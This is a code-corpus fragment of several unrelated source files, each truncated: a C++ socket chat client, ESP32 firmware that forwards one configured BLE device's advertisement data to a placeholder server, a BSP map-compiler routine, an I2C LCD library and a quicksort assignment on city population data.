    "#include <chrono>\n#include <ctime>\n#include <functional>\n#include <iostream>\n#include <string>\n#include <thread>\n#include <unordered_map>\n#include <vector>\n\n#include \"json.hpp\"\nusing namespace std;\nusing json = nlohmann::json;\n\n#include <arpa/inet.h>\n#include <netinet/in.h>\n#include <semaphore.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <unistd.h>\n\n#include <atomic>\n\n#include \"group.hpp\"\n#include \"public.hpp\"\n#include \"user.hpp\"\n\n// \u8bb0\u5f55\u5f53\u524d\u7cfb\u7edf\u767b\u5f55\u7684\u7528\u6237\u4fe1\u606f\nUser g_currentUser;\n// \u8bb0\u5f55\u5f53\u524d\u767b\u5f55\u7528\u6237\u7684\u597d\u53cb\u5217\u8868\u4fe1\u606f\nvector<User> g_currentUserFriendList;\n// \u8bb0\u5f55\u5f53\u524d\u767b\u5f55\u7528\u6237\u7684\u7fa4\u7ec4\u5217\u8868\u4fe1\u606f\nvector<Group> g_currentUserGroupList;\n\n// \u63a7\u5236\u4e3b\u83dc\u5355\u9875\u9762\u7a0b\u5e8f\nbool isMainMenuRunning = false;\n\n// \u7528\u4e8e\u8bfb\u5199\u7ebf\u7a0b\u4e4b\u95f4\u7684\u901a\u4fe1\nsem_t rwsem;\n// \u8bb0\u5f55\u767b\u5f55\u72b6\u6001\natomic_bool g_isLoginSuccess{false};\n\n// \u63a5\u6536\u7ebf\u7a0b\nvoid readTaskHandler(int clientfd);\n// \u83b7\u53d6\u7cfb\u7edf\u65f6\u95f4\uff08\u804a\u5929\u4fe1\u606f\u9700\u8981\u6dfb\u52a0\u65f6\u95f4\u4fe1\u606f\uff09\nstring getCurrentTime();\n// \u4e3b\u804a\u5929\u9875\u9762\u7a0b\u5e8f\nvoid mainMenu(int);\n// \u663e\u793a\u5f53\u524d\u767b\u5f55\u6210\u529f\u7528\u6237\u7684\u57fa\u672c\u4fe1\u606f\nvoid showCurrentUserData();\n\n// \u804a\u5929\u5ba2\u6237\u7aef\u7a0b\u5e8f\u5b9e\u73b0\uff0cmain\u7ebf\u7a0b\u7528\u4f5c\u53d1\u9001\u7ebf\u7a0b\uff0c\u5b50\u7ebf\u7a0b\u7528\u4f5c\u63a5\u6536\u7ebf\u7a0b\nint main(int argc, char **argv) {\n  if (argc < 3) {\n    cerr << \"command invalid! example: ./ChatClient 127.0.0.1 6000\" << endl;\n    exit(-1);\n  }\n\n  // \u89e3\u6790\u901a\u8fc7\u547d\u4ee4\u884c\u53c2\u6570\u4f20\u9012\u7684ip\u548cport\n  char *ip = argv[1];\n  uint16_t port = atoi(argv[2]);\n\n  // \u521b\u5efaclient\u7aef\u7684socket\n  int clientfd = socket(AF_INET, SOCK_STREAM, 0);\n  if (-1 == clientfd) {\n    cerr << \"socket create error\" << endl;\n    exit(-1);\n  }\n\n  // \u586b\u5199client\u9700\u8981\u8fde\u63a5\u7684server\u4fe1\u606fip+port\n  sockaddr_in server;\n  memset(&server, 0, sizeof(sockaddr_in));\n\n  server.sin_family = AF_INET;\n  server.sin_port = htons(port);\n  server.sin_addr.s_addr = inet_addr(ip);\n\n  // client\u548cserver\u8fdb\u884c\u8fde\u63a5\n  if (-1 == connect(clientfd, (sockaddr *)&server, sizeof(sockaddr_in))) {\n    cerr << \"connect server error\" << endl;\n    close(clientfd);\n    exit(-1);\n  }\n\n  // \u521d\u59cb\u5316\u8bfb\u5199\u7ebf\u7a0b\u901a\u4fe1\u7528\u7684\u4fe1\u53f7\u91cf\n  sem_init(&rwsem, 0, 0);\n\n  // \u8fde\u63a5\u670d\u52a1\u5668\u6210\u529f\uff0c\u542f\u52a8\u63a5\u6536\u5b50\u7ebf\u7a0b\n  std::thread readTask(readTaskHandler, clientfd);  // pthread_create\n  readTask.detach();                                // pthread_detach\n\n  // main\u7ebf\u7a0b\u7528\u4e8e\u63a5\u6536\u7528\u6237\u8f93\u5165\uff0c\u8d1f\u8d23\u53d1\u9001\u6570\u636e\n  for (;;) {\n    // \u663e\u793a\u9996\u9875\u9762\u83dc\u5355 \u767b\u5f55\u3001\u6ce8\u518c\u3001\u9000\u51fa\n    cout << \"========================\" << endl;\n    cout << \"1. login\" << endl;\n    cout << \"2. register\" << endl;\n    cout << \"3. quit\" << endl;\n    cout << \"========================\" << endl;\n    cout << \"choice:\";\n    int choice = 0;\n    cin >> choice;\n    cin.get();  // \u8bfb\u6389\u7f13\u51b2\u533a\u6b8b\u7559\u7684\u56de\u8f66\n\n    switch (choice) {\n      case 1:  // login\u4e1a\u52a1\n      {\n        int id = 0;\n        char pwd[50] = {0};\n        cout << \"userid:\";\n        cin >> id;\n        cin.get();  // \u8bfb\u6389\u7f13\u51b2\u533a\u6b8b\u7559\u7684\u56de\u8f66\n        cout << \"userpassword:\";\n        cin.getline(pwd, 50);\n\n        json js;\n        js[\"msgid\"] = LOGIN_MSG;\n        js[\"id\"] = id;\n        js[\"password\"] = pwd;\n        string request = js.dump();\n\n        g_isLoginSuccess = false;\n\n        int len =\n            send(clientfd, request.c_str(), strlen(request.c_str()) + 1, 0);\n        if (len == -1) {\n          cerr << \"send login msg error:\" << request << endl;\n        }\n\n        sem_wait(\n            &rwsem);  // \u7b49\u5f85\u4fe1\u53f7\u91cf\uff0c\u7531\u5b50\u7ebf\u7a0b\u5904\u7406\u5b8c\u767b\u5f55\u7684\u54cd\u5e94\u6d88\u606f\u540e\uff0c\u901a\u77e5\u8fd9\u91cc\n\n        if (g_isLoginSuccess) {\n          // \u8fdb\u5165\u804a\u5929\u4e3b\u83dc\u5355\u9875\u9762\n          isMainMenuRunning = true;\n          mainMenu(clientfd);\n        }\n      } break;\n      case 2:  // register\u4e1a\u52a1\n      {\n        char name[50] = {0};\n        char pwd[50] = {0};\n        cout << \"username:\";\n        cin.getline(name, 50);\n        cout << \"userpassword:\";\n        cin.getline(pwd, 50);\n\n        json js;\n        js[\"msgid\"] = REG_MSG;\n\n        js[\"name\"] = name;\n        js[\"password\"] = pwd;\n        string request = js.dump();\n        cout << request << endl;\n        int len =\n            send(clientfd, request.c_str(), strlen(request.c_str()) + 1, 0);\n        if (len == -1) {\n          cerr << \"send reg msg error:\" << request << endl;\n        }\n\n        sem_wait(&rwsem);  // \u7b49\u5f85\u4fe1\u53f7\u91cf\uff0c\u5b50\u7ebf\u7a0b\u5904\u7406\u5b8c\u6ce8\u518c\u6d88\u606f\u4f1a\u901a\u77e5\n      } break;\n      case 3:  // quit\u4e1a\u52a1\n        close(clientfd);\n        sem_destroy(&rwsem);\n        exit(0);\n      default:\n        cerr << \"invalid input!\" << endl;\n        break;\n    }\n  }\n\n  return 0;\n}\n\n// \u5904\u7406\u6ce8\u518c\u7684\u54cd\u5e94\u903b\u8f91\nvoid doRegResponse(json &responsejs) {\n  if (0 != responsejs[\"errno\"].get<int>())  // \u6ce8\u518c\u5931\u8d25\n  {\n    cerr << \"name is already exist, register error!\" << endl;\n  } else  // \u6ce8\u518c\u6210\u529f\n  {\n    cout << \"name register success, userid is \" << responsejs[\"id\"]\n         << \", do not forget it!\" << endl;\n  }\n}\n\n// \u5904\u7406\u767b\u5f55\u7684\u54cd\u5e94\u903b\u8f91\nvoid doLoginResponse(json &responsejs) {\n  if (0 != responsejs[\"errno\"].get<int>())  // \u767b\u5f55\u5931\u8d25\n  {\n    cerr << responsejs[\"errmsg\"] << endl;\n    g_isLoginSuccess = false;\n  } else  // \u767b\u5f55\u6210\u529f\n  {\n    // \u8bb0\u5f55\u5f53\u524d\u7528\u6237\u7684id\u548cname\n    g_currentUser.setId(responsejs[\"id\"].get<int>());\n    g_currentUser.setName(responsejs[\"name\"]);\n\n    // \u8bb0\u5f55\u5f53\u524d\u7528\u6237\u7684\u597d\u53cb\u5217\u8868\u4fe1\u606f\n    if (responsejs.contains(\"friends\")) {\n      // \u521d\u59cb\u5316\n      g_currentUserFriendList.clear();\n\n      vector<string> vec = responsejs[\"friends\"];\n      for (string &str : vec) {\n        json js = json::parse(str);\n        User user;\n        user.setId(js[\"id\"].get<int>());\n        user.setName(js[\"name\"]);\n        user.setState(js[\"state\"]);\n        g_currentUserFriendList.push_back(user);\n      ",
    "#include <Arduino.h>\r\n#include <WiFi.h>\r\n#include <HTTPClient.h>\r\n#include <BLEDevice.h>\r\n#include <BLEUtils.h>\r\n#include <BLEScan.h>\r\n#include <BLEAdvertisedDevice.h>\r\n#if __has_include(\"esp_eap_client.h\")\r\n#include \"esp_eap_client.h\"\r\n#else\r\n#include \"esp_wpa2.h\"\r\n#endif\r\n#include <Wire.h>\r\n#include <esp_task_wdt.h> // \u5f15\u5165\u770b\u95e8\u72d7\u5b9a\u65f6\u5668\u7684\u5934\u6587\u4ef6\r\n\r\n\r\n#define EAP_IDENTITY \"wifi\u8d26\u6237\"\r\n#define EAP_PASSWORD \"wifi\u5bc6\u7801\"\r\nconst char *ssid = \"wifi\u540d\u5b57\";\r\nint counter = 0;\r\nint scanTime = 1; // In seconds\r\nunsigned long startMillis;  // \u8bb0\u5f55\u7a0b\u5e8f\u542f\u52a8\u7684\u65f6\u95f4\r\nunsigned long restartInterval = 1800000; // 30\u5206\u949f\u4ee5\u6beb\u79d2\u4e3a\u5355\u4f4d\r\n\r\n\r\n\r\nBLEScan* pBLEScan;\r\n\r\nconst int LED_PIN = 2; // \u5b9a\u4e49ESP32\u7684LED\u5f15\u811a\r\n\r\nBLEUUID serviceUUID(\"\u586b\u5165\u8981\u626b\u63cf\u8bbe\u5907\u7684serviceUUID\");  //\u5168\u90e8\u5c0f\u5199\u5b57\u6bcd\r\nconst char* targetDeviceMacAddress = \"\u586b\u5165\u8981\u626b\u63cf\u8bbe\u5907\u7684mac\u5730\u5740\";  //\u5168\u90e8\u5c0f\u5199\u5b57\u6bcd\r\n\r\n\r\nclass MyAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {\r\n    void onResult(BLEAdvertisedDevice advertisedDevice) override {\r\n\r\n      if (advertisedDevice.haveServiceUUID() && advertisedDevice.isAdvertisingService(serviceUUID)&&advertisedDevice.getAddress().toString() == targetDeviceMacAddress){ \r\n        pBLEScan->stop();\r\n        Serial.printf(\"Advertised Device: %s \\n\", advertisedDevice.toString().c_str());\r\n\r\n        String rawDataHex = \"02010617FF\"; //manufacturerdata\u524d\u8865\u5145\u7684\u6570\u636e\r\n        std::string rawData = advertisedDevice.getManufacturerData();\r\n        for (auto byte : rawData) {\r\n            char buf[3];\r\n            snprintf(buf, sizeof(buf), \"%02X\", (unsigned char)byte);\r\n            rawDataHex += buf;\r\n        }\r\n        rawDataHex += \"03033CFE0C0952544B5F42545F342E3100\";//manufacturerdata\u540e\u8865\u5145\u7684\u6570\u636e\r\n\r\n        String jsonString = \"{\\\"rawData\\\":\\\"\" + rawDataHex + \"\\\"}\";\r\n\r\n        HTTPClient http;\r\n        http.begin(\"http://\u670d\u52a1\u5668ip\u5730\u5740:3000/data\");   //\u5728\u8fd9\u5199\u5165\u670d\u52a1\u5668api\r\n        http.addHeader(\"Content-Type\", \"application/json\");\r\n        int httpResponseCode = http.POST(jsonString);\r\n\r\n        if (httpResponseCode > 0) {\r\n            String response = http.getString();\r\n            Serial.println(httpResponseCode);\r\n            Serial.println(response);\r\n        } else {\r\n            Serial.print(\"Error on sending POST: \");\r\n            Serial.println(httpResponseCode);\r\n        }\r\n\r\n        http.end();\r\n\r\n        digitalWrite(LED_PIN, HIGH);\r\n        delay(500);\r\n        digitalWrite(LED_PIN, LOW);\r\n      }\r\n    }\r\n};\r\n\r\nvoid setup() {\r\n  Serial.begin(115200);\r\n  pinMode(LED_PIN, OUTPUT);\r\n  delay(10);\r\n  Serial.println();\r\n  Serial.print(\"Connecting to network: \");\r\n  Serial.println(ssid);\r\n  WiFi.disconnect(true);\r\n  WiFi.mode(WIFI_STA);\r\n#if __has_include(\"esp_eap_client.h\")\r\n  esp_eap_client_set_identity((uint8_t *)EAP_IDENTITY, strlen(EAP_IDENTITY));\r\n  esp_eap_client_set_username((uint8_t *)EAP_IDENTITY, strlen(EAP_IDENTITY));\r\n  esp_eap_client_set_password((uint8_t *)EAP_PASSWORD, strlen(EAP_PASSWORD));\r\n  esp_wifi_sta_enterprise_enable();\r\n#else\r\n  esp_wifi_sta_wpa2_ent_set_identity((uint8_t *)EAP_IDENTITY, strlen(EAP_IDENTITY));\r\n  esp_wifi_sta_wpa2_ent_set_username((uint8_t *)EAP_IDENTITY, strlen(EAP_IDENTITY));\r\n  esp_wifi_sta_wpa2_ent_set_password((uint8_t *)EAP_PASSWORD, strlen(EAP_PASSWORD));\r\n  esp_wifi_sta_wpa2_ent_enable();\r\n#endif\r\n  WiFi.begin(ssid);\r\n  while (WiFi.status() != WL_CONNECTED) {\r\n    delay(500);\r\n    Serial.print(\".\");\r\n    counter++;\r\n    if (counter >= 60) {\r\n      ESP.restart();\r\n    }\r\n  }\r\n  Serial.println(\"WiFi connected\");\r\n  Serial.println(\"IP address set: \");\r\n  Serial.println(WiFi.localIP());\r\n\r\n  startMillis = millis();  // \u521d\u59cb\u5316\u542f\u52a8\u65f6\u95f4\r\n\r\n  esp_task_wdt_init(30, true);// \u521d\u59cb\u5316\u770b\u95e8\u72d7\u5b9a\u65f6\u5668\uff0c\u8bbe\u7f6e\u8d85\u65f6\u4e3a30\u79d2\r\n  \r\n  esp_task_wdt_add(NULL);// \u5c06\u5f53\u524d\u4efb\u52a1\u6dfb\u52a0\u5230\u770b\u95e8\u72d7\u76d1\u63a7\u5217\u8868\r\n\r\n\r\n\r\n  BLEDevice::init(\"\");\r\n  pBLEScan = BLEDevice::getScan();\r\n  pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());\r\n  pBLEScan->setActiveScan(true);\r\n  pBLEScan->setInterval(100);\r\n  pBLEScan->setWindow(99);\r\n}\r\n\r\nvoid loop() {\r\n    unsigned long startTime = millis(); // \u8bb0\u5f55\u626b\u63cf\u5f00\u59cb\u7684\u65f6\u95f4\r\n    BLEScanResults foundDevices = pBLEScan->start(scanTime, false);\r\n    unsigned long scanDuration = millis() - startTime; // \u8ba1\u7b97\u626b\u63cf\u6301\u7eed\u7684\u65f6\u95f4\r\n    Serial.println(\"Scan done!\");\r\n    if (scanDuration > (2000)) {\r\n        Serial.println(\"BLE scan timeout, restarting...\");\r\n        ESP.restart(); // \u5982\u679c\u68c0\u6d4b\u5230\u8d85\u65f6\uff0c\u5219\u91cd\u542fESP32\r\n    }\r\n    pBLEScan->clearResults(); // \u6e05\u9664\u626b\u63cf\u7ed3\u679c\u4ee5\u91ca\u653e\u5185\u5b58\r\n\r\n\r\nif (millis() - startMillis > restartInterval) {\r\n        Serial.println(\"Restarting after 30 minutes...\");\r\n        ESP.restart();\r\n    }\r\n\r\n\r\n  if (WiFi.status() == WL_CONNECTED) {\r\n    counter = 0;\r\n    Serial.println(\"Wifi is still connected with IP: \");\r\n    Serial.println(WiFi.localIP());\r\n  } else if (WiFi.status() != WL_CONNECTED) {\r\n    WiFi.begin(ssid);\r\n  }\r\n  while (WiFi.status() != WL_CONNECTED) {\r\n    delay(500);\r\n    Serial.print(\".\");\r\n    counter++;\r\n    if (counter >= 60) {\r\n      ESP.restart();\r\n      esp_task_wdt_reset(); // \u5728\u7f51\u7edc\u7b49\u5f85\u5faa\u73af\u4e2d\u4e5f\u8981\u4e0d\u65ad\u91cd\u7f6e\u770b\u95e8\u72d7\u5b9a\u65f6\u5668\r\n    }\r\n  }\r\n  delay(10000);\r\n  esp_task_wdt_reset(); // \u4e5f\u5728\u957f\u65f6\u95f4\u7684delay\u540e\u91cd\u7f6e\u770b\u95e8\u72d7\u5b9a\u65f6\u5668\r\n}\r\n",
    "#include \"bsp5.h\"\n\n//  SubdivideFace\n\n//  InitHash\n//  HashVec\n\n//  GetVertex\n//  GetEdge\n//  MakeFaceEdges\n\nstatic int subdivides;\n\n/* a surface has all of the faces that could be drawn on a given plane\n   the outside filling stage can remove some of them so a better bsp can be generated */\n\n// =====================================================================================\n//  SubdivideFace\n//      If the face is >256 in either texture direction, carve a valid sized\n//      piece off and insert the remainder in the next link\n// =====================================================================================\nvoid SubdivideFace(face_t *f, face_t **prevptr) {\n    vec_t mins, maxs;\n    vec_t v;\n    int axis;\n    int i;\n    dplane_t plane;\n    face_t *front;\n    face_t *back;\n    face_t *next;\n    texinfo_t *tex;\n    vec3_t temp;\n\n    // special (non-surface cached) faces don't need subdivision\n\n    tex = &g_texinfo[f->texturenum];\n\n    if (tex->flags & TEX_SPECIAL) {\n        return;\n    }\n\n    if (f->facestyle == face_hint) {\n        return;\n    }\n    if (f->facestyle == face_skip) {\n        return;\n    }\n\n#ifdef ZHLT_NULLTEX// AJM\n    if (f->facestyle == face_null)\n        return;// ideally these should have their tex_special flag set, so its here jic\n#endif\n\n    for (axis = 0; axis < 2; axis++) {\n        while (1) {\n            mins = 999999;\n            maxs = -999999;\n\n            for (i = 0; i < f->numpoints; i++) {\n                v = DotProduct(f->pts[i], tex->vecs[axis]);\n                if (v < mins) {\n                    mins = v;\n                }\n                if (v > maxs) {\n                    maxs = v;\n                }\n            }\n\n            if ((maxs - mins) <= g_subdivide_size) {\n                break;\n            }\n\n            // split it\n            subdivides++;\n\n            VectorCopy(tex->vecs[axis], temp);\n            v = VectorNormalize(temp);\n\n            VectorCopy(temp, plane.normal);\n            plane.dist = (mins + g_subdivide_size - 16) / v;\n            next = f->next;\n            SplitFace(f, &plane, &front, &back);\n            if (!front || !back) {\n                Developer(DEVELOPER_LEVEL_SPAM, \"SubdivideFace: didn't split the %d-sided polygon @(%.0f,%.0f,%.0f)\",\n                          f->numpoints, f->pts[0][0], f->pts[0][1], f->pts[0][2]);\n                break;\n            }\n            *prevptr = back;\n            back->next = front;\n            front->next = next;\n            f = back;\n        }\n    }\n}\n\n//===========================================================================\n\ntypedef struct hashvert_s {\n    struct hashvert_s *next;\n    vec3_t point;\n    int num;\n    int numplanes;// for corner determination\n    int planenums[2];\n    int numedges;\n} hashvert_t;\n\n// #define      POINT_EPSILON   0.01\n#define POINT_EPSILON ON_EPSILON\n\nstatic hashvert_t hvertex[MAX_MAP_VERTS];\nstatic hashvert_t *hvert_p;\n\nstatic face_t *edgefaces[MAX_MAP_EDGES][2];\nstatic int firstmodeledge = 1;\nstatic int firstmodelface;\n\n//============================================================================\n\n#define NUM_HASH 4096\n\nstatic hashvert_t *hashverts[NUM_HASH];\n\nstatic vec3_t hash_min;\nstatic vec3_t hash_scale;\n\n// =====================================================================================\n//  InitHash\n// =====================================================================================\nstatic void InitHash() {\n    vec3_t size;\n    vec_t volume;\n    vec_t scale;\n    int newsize[2];\n    int i;\n\n    memset(hashverts, 0, sizeof(hashverts));\n\n    for (i = 0; i < 3; i++) {\n        hash_min[i] = -8000;\n        size[i] = 16000;\n    }\n\n    volume = size[0] * size[1];\n\n    scale = sqrt(volume / NUM_HASH);\n\n    newsize[0] = size[0] / scale;\n    newsize[1] = size[1] / scale;\n\n    hash_scale[0] = newsize[0] / size[0];\n    hash_scale[1] = newsize[1] / size[1];\n    hash_scale[2] = newsize[1];\n\n    hvert_p = hvertex;\n}\n\n// =====================================================================================\n//  HashVec\n// =====================================================================================\nstatic unsigned HashVec(const vec3_t vec) {\n    unsigned h;\n\n    h = hash_scale[0] * (vec[0] - hash_min[0]) * hash_scale[2] + hash_scale[1] * (vec[1] - hash_min[1]);\n    if (h >= NUM_HASH) {\n        return NUM_HASH - 1;\n    }\n    return h;\n}\n\n// =====================================================================================\n//  GetVertex\n// =====================================================================================\nstatic int GetVertex(const vec3_t in, const int planenum) {\n    int h;\n    int i;\n    hashvert_t *hv;\n    vec3_t vert;\n\n    for (i = 0; i < 3; i++) {\n        if (fabs(in[i] - VectorRound(in[i])) < 0.001) {\n            vert[i] = VectorRound(in[i]);\n        } else {\n            vert[i] = in[i];\n        }\n    }\n\n    h = HashVec(vert);\n\n    for (hv = hashverts[h]; hv; hv = hv->next) {\n        if (fabs(hv->point[0] - vert[0]) < POINT_EPSILON ",
    "#include \"LiquidCrystal_I2C.h\"\r\n#include <inttypes.h>\r\n#if defined(ARDUINO) && ARDUINO >= 100\r\n\r\n#include \"Arduino.h\"\r\n\r\n#define printIIC(args)\tWire.write(args)\r\ninline size_t LiquidCrystal_I2C::write(uint8_t value) {\r\n\tsend(value, Rs);\r\n\treturn 1;\r\n}\r\n\r\n#else\r\n#include \"WProgram.h\"\r\n\r\n#define printIIC(args)\tWire.send(args)\r\ninline void LiquidCrystal_I2C::write(uint8_t value) {\r\n\tsend(value, Rs);\r\n}\r\n\r\n#endif\r\n#include \"Wire.h\"\r\n\r\n\r\n\r\n// When the display powers up, it is configured as follows:\r\n//\r\n// 1. Display clear\r\n// 2. Function set: \r\n//    DL = 1; 8-bit interface data \r\n//    N = 0; 1-line display \r\n//    F = 0; 5x8 dot character font \r\n// 3. Display on/off control: \r\n//    D = 0; Display off \r\n//    C = 0; Cursor off \r\n//    B = 0; Blinking off \r\n// 4. Entry mode set: \r\n//    I/D = 1; Increment by 1\r\n//    S = 0; No shift \r\n//\r\n// Note, however, that resetting the Arduino doesn't reset the LCD, so we\r\n// can't assume that its in that state when a sketch starts (and the\r\n// LiquidCrystal constructor is called).\r\n\r\nLiquidCrystal_I2C::LiquidCrystal_I2C(uint8_t lcd_Addr,uint8_t lcd_cols,uint8_t lcd_rows)\r\n{\r\n  _Addr = lcd_Addr;\r\n  _cols = lcd_cols;\r\n  _rows = lcd_rows;\r\n  _backlightval = LCD_NOBACKLIGHT;\r\n}\r\n\r\nvoid LiquidCrystal_I2C::init(){\r\n\tinit_priv();\r\n}\r\n\r\nvoid LiquidCrystal_I2C::init_priv()\r\n{\r\n\tWire.begin();\r\n\t_displayfunction = LCD_4BITMODE | LCD_1LINE | LCD_5x8DOTS;\r\n\tbegin(_cols, _rows);  \r\n}\r\n\r\nvoid LiquidCrystal_I2C::begin(uint8_t cols, uint8_t lines, uint8_t dotsize) {\r\n\tif (lines > 1) {\r\n\t\t_displayfunction |= LCD_2LINE;\r\n\t}\r\n\t_numlines = lines;\r\n\r\n\t// for some 1 line displays you can select a 10 pixel high font\r\n\tif ((dotsize != 0) && (lines == 1)) {\r\n\t\t_displayfunction |= LCD_5x10DOTS;\r\n\t}\r\n\r\n\t// SEE PAGE 45/46 FOR INITIALIZATION SPECIFICATION!\r\n\t// according to datasheet, we need at least 40ms after power rises above 2.7V\r\n\t// before sending commands. Arduino can turn on way befer 4.5V so we'll wait 50\r\n\tdelay(50); \r\n  \r\n\t// Now we pull both RS and R/W low to begin commands\r\n\texpanderWrite(_backlightval);\t// reset expanderand turn backlight off (Bit 8 =1)\r\n\tdelay(1000);\r\n\r\n  \t//put the LCD into 4 bit mode\r\n\t// this is according to the hitachi HD44780 datasheet\r\n\t// figure 24, pg 46\r\n\t\r\n\t  // we start in 8bit mode, try to set 4 bit mode\r\n   write4bits(0x03 << 4);\r\n   delayMicroseconds(4500); // wait min 4.1ms\r\n   \r\n   // second try\r\n   write4bits(0x03 << 4);\r\n   delayMicroseconds(4500); // wait min 4.1ms\r\n   \r\n   // third go!\r\n   write4bits(0x03 << 4); \r\n   delayMicroseconds(150);\r\n   \r\n   // finally, set to 4-bit interface\r\n   write4bits(0x02 << 4); \r\n\r\n\r\n\t// set # lines, font size, etc.\r\n\tcommand(LCD_FUNCTIONSET | _displayfunction);  \r\n\t\r\n\t// turn the display on with no cursor or blinking default\r\n\t_displaycontrol = LCD_DISPLAYON | LCD_CURSOROFF | LCD_BLINKOFF;\r\n\tdisplay();\r\n\t\r\n\t// clear it off\r\n\tclear();\r\n\t\r\n\t// Initialize to default text direction (for roman languages)\r\n\t_displaymode = LCD_ENTRYLEFT | LCD_ENTRYSHIFTDECREMENT;\r\n\t\r\n\t// set the entry mode\r\n\tcommand(LCD_ENTRYMODESET | _displaymode);\r\n\t\r\n\thome();\r\n  \r\n}\r\n\r\n/********** high level commands, for the user! */\r\nvoid LiquidCrystal_I2C::clear(){\r\n\tcommand(LCD_CLEARDISPLAY);// clear display, set cursor position to zero\r\n\tdelayMicroseconds(2000);  // this command takes a long time!\r\n}\r\n\r\nvoid LiquidCrystal_I2C::home(){\r\n\tcommand(LCD_RETURNHOME);  // set cursor position to zero\r\n\tdelayMicroseconds(2000);  // this command takes a long time!\r\n}\r\n\r\nvoid LiquidCrystal_I2C::setCursor(uint8_t col, uint8_t row){\r\n\tint row_offsets[] = { 0x00, 0x40, 0x14, 0x54 };\r\n\tif ( row > (_numlines-1) ) {\r\n\t\trow = _numlines-1;    // we count rows starting w/0\r\n\t}\r\n\tcommand(LCD_SETDDRAMADDR | (col + row_offsets[row]));\r\n}\r\n\r\n// Turn the display on/off (quickly)\r\nvoid LiquidCrystal_I2C::noDisplay() {\r\n\t_displaycontrol &= ~LCD_DISPLAYON;\r\n\tcommand(LCD_DISPLAYCONTROL | _displaycontrol);\r\n}\r\nvoid LiquidCrystal_I2C::display() {\r\n\t_displaycontrol |= LCD_DISPLAYON;\r\n\tcommand(LCD_DISPLAYCONTROL | _displaycontrol);\r\n}\r\n\r\n// Turns the underline cursor on/off\r\nvoid LiquidCrystal_I2C::noCursor() {\r\n\t_displaycontrol &= ~LCD_CURSORON;\r\n\tcommand(LCD_DISPLAYCONTROL | _displaycontrol);\r\n}\r\nvoid LiquidCrystal_I2C::cursor() {\r\n\t_displaycontrol |= LCD_CURSORON;\r\n\tcommand(LCD_DISPLAYCONTROL | _displaycontrol);\r\n}\r\n\r\n// Turn on and off the blinking cursor\r\nvoid LiquidCrystal_I2C::noBlink() {\r\n\t_displaycontrol &= ~LCD_BLINKON;\r\n\tcommand(LCD_DISPLAYCONTROL | _displaycontrol);\r\n}\r\nvoid LiquidCrystal_I2C::blink() {\r\n\t_displaycontrol |= LCD_BLINKON;\r\n\tcommand(LCD_DISPLAYCONTROL | _displaycontrol);\r\n}\r\n\r\n// These commands scroll the display without changing the RAM\r\nvoid LiquidCrystal_I2C::scrollDisplayLeft(void) {\r\n\tcommand(LCD_CURSORSHIFT | LCD_DISPLAYMOVE | LCD_MOVELEFT);\r\n}\r\nvoid LiquidCrystal_I2C::scrollDisplayRight(void) {\r\n\tcommand(LCD_CURSORSHIFT | LCD_DISPLAYMOVE | LCD_MOVERIGHT);\r\n}\r\n\r\n// This is for text that flows Left to Right\r\nvoid LiquidCrystal_I2C::leftToRight(void",
    "#include <sstream>\n#include <vector>\n#include <string>\n#include <chrono>\n#include <cstdlib>\n#include <iostream>\n#include <fstream>\nusing namespace std::chrono;\nusing namespace std;\n\nstruct population_data\n{\n    string city;\n    int population;\n};\n\nvector<population_data> read_file(const string &filename) // reading csv files\n{\n    vector<population_data> data;\n    ifstream file(filename);\n    string line, city;\n    int population;\n    while (getline(file, line))\n    {\n        stringstream ss(line);\n        getline(ss, city, ';');\n        ss >> population;\n        data.push_back({city, population});\n        // getting city and population\n    }\n    return data;\n}\n\n// logs when verbose is true\nvoid write_log(ofstream &logFile, int l, int h, int pivot, vector<population_data> &arr)\n{\n    if (logFile.is_open())\n    {\n        logFile << \" Pivot: \" << pivot << \" Array: [\";\n        for (int k = l; k <= h; k++)\n        {\n            logFile << arr[k].population << (k < h ? \", \" : \"\");\n        }\n        logFile << \"]\" << endl;\n    }\n}\nvoid swap_elements(vector<population_data> &P, int first, int second)\n{\n    population_data temp = P[first];\n    P[first] = P[second];\n    P[second] = temp;\n}\n\nint partition(vector<population_data> &P, int l, int h, ofstream &logFile, bool v) // partition last element\n{\n\n    population_data pivot = P[h];\n    // choosing the pivot as last element from the array\n    int temp = 0;\n    int i = (l - 1);\n\n    for (int j = l; j <= h; j++)\n    {\n        // When current population value of an element is smaller than the pivot population value\n        if (P[j].population < pivot.population)\n        {\n            i++;\n            swap_elements(P, i, j);\n        }\n    }\n\n    swap_elements(P, i + 1, h);\n    if (v == true)\n    {\n        write_log(logFile, l, h, pivot.population, P);\n    }\n\n    return (i + 1); // return pivot's place\n}\n\nint partition_random(vector<population_data> &P, int l, int h, ofstream &logFile, bool v)\n{\n    srand(time(0));\n    int x = rand() % (h - l + 1);\n    int random_variable = l + x; // finding random variable between h and l\n    swap_elements(P, random_variable, h);\n    return partition(P, l, h, logFile, v);\n}\n\nint partition_median(vector<population_data> &P, int l, int h, ofstream &logFile, bool v)\n{\n    srand(time(0));\n\t// 3 random element\n    int a = l + rand() % (h - l + 1);\n    int b = l + rand() % (h - l + 1);\n    int c = l + rand() % (h - l + 1);\n    int temp;\n\t// finding median of three\n    if ((P[a].population < P[b].population && P[b].population < P[c].population) || (P[c].population < P[b].population && P[b].population < P[a].population))\n    {\n        swap_elements(P, b, h);\n    }\n\n    else if ((P[b].population < P[a].population && P[a].population < P[c].population) || (P[c].population < P[a].population && P[a].population < P[b].population))\n    {\n        swap_elements(P, a, h);\n    }\n    else\n        swap_elements(P, c, h);\n\n    return partition(P, l, h, logFile, v);\n}\n\nvoid insertionSort(vector<population_data> &P, int l, int h)\n{\n    int i, j;\n    population_data key;\n    for (i = l; i < h + 1; i++)\n    {\n        key = P[i];\n        j = i - 1;\n\n        while (j >= 0 && P[j].population > key.population)\n        {\n            P[j + 1] = P[j];\n            j = j - 1;\n        }\n        P[j + 1] = key;\n    }\n}\n\nvoid quickSort(vector<population_data> &P, int l, int h, string type, int k, ofstream &logFile, bool v)\n{\n    // when low is less than high\n    if (l < h)\n    {\n        int pivot;\n        int size = h - l + 1;\n        if ((k >= size) && (k != 1))\n        {\n            insertionSort(P, l, h);\n        }\n        else\n        {\n            if (k == 1 || type == \"l\")\n            {\n                pivot = partition(P, l, h, logFile, v);\n            }\n            else if (type == \"m\")\n            {\n                pivot = partition_median(P, l, h, logFile, v);\n            }\n            else\n            {\n                pivot = partition_random(P, l, h, logFile, v);\n            }\n\n            